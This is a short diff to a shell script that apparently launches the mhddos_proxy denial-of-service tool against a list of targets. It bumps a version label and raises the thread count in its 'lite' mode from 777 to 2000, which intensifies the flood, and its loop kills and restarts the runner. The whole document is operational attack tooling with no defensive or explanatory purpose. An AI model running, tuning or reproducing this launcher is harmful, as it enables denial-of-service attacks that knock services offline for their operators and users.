@@ -176,7 +176,7 @@ while [ "$1" != "" ]; do
         --no-uvloop ) export uvloop="off"; shift ;;
         -h | --help )    usage;   exit ;;
         #*  )   usage;   exit ;;
-        *   ) export args_to_pass+=" $1"; shift 1; echo $args_to_pass && echo " v5" && sleep 2 ;;
+        *   ) export args_to_pass+=" $1"; shift 1; echo $args_to_pass && echo " v6" && sleep 2 ;;
     esac
 done
 
@@ -219,7 +219,7 @@ while true; do
     pkill -f start.py; pkill -f runner.py 
     if [[ $lite == "on" ]]; then
         tail -n 1000 $targets_uniq > $targets_lite
-        python3 ~/multidd/mhddos_proxy/runner.py -c $targets_lite $methods $args_to_pass -t 777 &
+        python3 ~/multidd/mhddos_proxy/runner.py -c $targets_lite $methods $args_to_pass -t 2000 &
     else
         python3 ~/multidd/mhddos_proxy/runner.py -c $t1 $methods $args_to_pass &
         sleep 10 # to decrease load on cpu during simultaneous start
